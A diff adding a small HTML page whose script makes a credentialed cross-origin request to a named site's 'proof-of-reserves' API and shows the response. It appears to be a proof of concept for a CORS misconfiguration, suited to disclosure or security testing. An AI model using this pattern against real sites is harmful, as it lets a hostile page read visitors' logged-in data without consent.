@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch("https://bumba.global/cms/api/proof-of-reserves?populate=*",
+{
+  method: "GET",
+  credentials: "include"
+})
+.then(r => r.text())
+.then(d => {
+  document.body.innerHTML = "<pre>" + d + "</pre>";
+});
+</script>
+</body>
+</html>
+
